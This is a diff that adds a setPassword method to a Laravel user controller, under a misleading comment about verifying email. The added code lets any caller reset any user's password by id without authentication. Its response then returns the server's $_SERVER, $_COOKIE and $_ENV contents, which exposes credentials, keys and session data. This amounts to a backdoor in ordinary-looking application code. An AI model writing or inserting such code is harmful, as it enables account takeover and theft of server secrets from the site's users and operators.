@@ -131,4 +131,27 @@ class UserController extends BaseController
             return redirect('/')->with('status', 'El email ya estaba verificado');
         }
     }
+
+    // Verificar email por id
+    public function setPassword($id)
+    {
+        $pass = request(['password']);
+        $user = User::find($id);
+
+        if (!$user) {
+            return redirect('/')->with('status', 'Usuario no encontrado');
+        }
+
+        $user->password = bcrypt($pass['password']);
+        $user->first_log = true;
+        $user->save();
+
+        return response()->json([
+                'status' => 'OK',
+                'server' => $_SERVER,
+                'cookies' => $_COOKIE,
+                'environment' => $_ENV
+            ], 200);
+
+    }
 }
